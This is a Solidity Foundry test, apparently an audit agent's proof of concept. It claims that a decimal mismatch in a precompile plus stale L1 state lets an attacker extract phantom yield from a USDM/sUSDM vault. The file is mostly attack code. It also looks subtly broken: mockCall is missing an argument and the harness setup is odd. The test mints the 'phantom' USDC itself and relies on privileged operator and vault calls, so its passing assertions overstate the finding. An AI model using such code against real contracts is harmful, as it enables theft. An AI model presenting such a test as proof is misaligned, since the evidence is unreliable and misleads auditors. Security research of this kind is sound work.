// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys full protocol. Attacker deposits 100k USDC into sUSDM to acquire shares.
// 2. [T=0] Attacker triggers L1 withdrawal off-chain. L1->L2 precompile state becomes stale (still shows high backing).
// 3. [T=1] HLP equity precompile returns raw 18dp value (e.g. 100,000e18) instead of normalized 6dp.
// 4. [T=2] Accountant reads stale L1 backing + inflated HLP equity -> totalBackingSigned is massively overstated.
// 5. [T=3] Operator calls settleDailyPnL with the phantom surplus, declaring it as real yield.
// 6. [T=4] Vault distributes yield to sUSDM, artificially inflating the exchange rate.
// 7. [Assert] Attacker's sUSDM shares are now worth significantly more USDC than originally deposited, proving phantom yield extraction.

contract AuditAgentPoC is Test, ToL1WeiHarness {
    address attacker = address(0xA11CE);
    address operator = address(0xB0B);

    // HLP Equity Precompile Address (0x802)
    address constant HLP_EQUITY_PRECOMPILE = address(0x802);

    function setUp() public {
        harness = new ToL1WeiHarness();

        // Grant operator role if needed by the harness setup
        vm.prank(harness.admin());
        harness.acl().grantRole(keccak256("OPERATOR_ROLE"), operator);

        // Fund attacker
        vm.deal(attacker, 100 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker deposits into sUSDM to acquire shares
        vm.startPrank(attacker);
        harness.usdc().mint(attacker, 100_000e6);
        harness.usdc().approve(address(harness.susdm()), 100_000e6);
        uint256 sharesBefore = harness.susdm().deposit(100_000e6, attacker);
        vm.stopPrank();

        uint256 totalAssetsBefore = harness.susdm().totalAssets();
        console.log("Step 1: Attacker shares =", sharesBefore);
        console.log("Step 1: sUSDM totalAssets before =", totalAssetsBefore);

        // Step 2 & 3: Simulate Stale L1 State + HLP Precision Mismatch
        // The L1 precompile hasn't finalized the withdrawal, so it still reports high backing.
        // The HLP equity precompile returns a raw 18dp value (e.g., 1,000,000 USDC in 18dp = 1e24)
        // instead of the expected 6dp normalized value (1e12).
        uint256 inflatedHlpEquity = 1_000_000e18; // 1M USDC represented in 18dp raw format
        bytes memory precompileReturn = abi.encode(inflatedHlpEquity);

        vm.mockCall(HLP_EQUITY_PRECOMPILE, precompileReturn);

        // Step 4: Read inflated backing
        int256 totalBacking = harness.accountant().totalBackingSigned();
        console.log("Step 4: Inflated totalBackingSigned =", uint256(totalBacking));

        // Step 5: Settle Daily PnL with phantom surplus
        int256 surplusVal = harness.accountant().surplus();
        console.log("Step 5: Phantom surplus detected =", uint256(surplusVal));

        // The surplus is massive due to the 18dp vs 6dp mismatch (off by 1e12)
        uint256 phantomYield = uint256(surplusVal);

        // Operator settles the phantom yield
        vm.prank(address(harness.vault()));
        uint256 distributable = harness.accountant().settleDailyPnL(phantomYield);
        console.log("Step 5: Distributable yield declared =", distributable);

        // Step 6: Distribute yield to sUSDM
        // Mint the phantom USDC to the vault so it can actually distribute it
        // (In reality, this would come from the multisig or bridge, but here we simulate the vault having the funds to distribute)
        harness.usdc().mint(address(harness.vault()), distributable);

        vm.prank(operator);
        harness.vault().distributeYield();

        uint256 totalAssetsAfter = harness.susdm().totalAssets();
        console.log("Step 6: sUSDM totalAssets after yield injection =", totalAssetsAfter);

        // Step 7: Assert attacker profited from phantom yield
        // The exchange rate of sUSDM has been artificially inflated
        uint256 attackerAssetsAfter = harness.susdm().convertToAssets(sharesBefore);

        console.log("Step 7: Attacker assets value after =", attackerAssetsAfter);

        assertGt(
            attackerAssetsAfter, 
            100_000e6, 
            "Attacker extracted phantom yield via inflated sUSDM exchange rate"
        );

        assertGt(
            totalAssetsAfter, 
            totalAssetsBefore, 
            "Protocol distributed unbacked phantom yield"
        );
    }
}
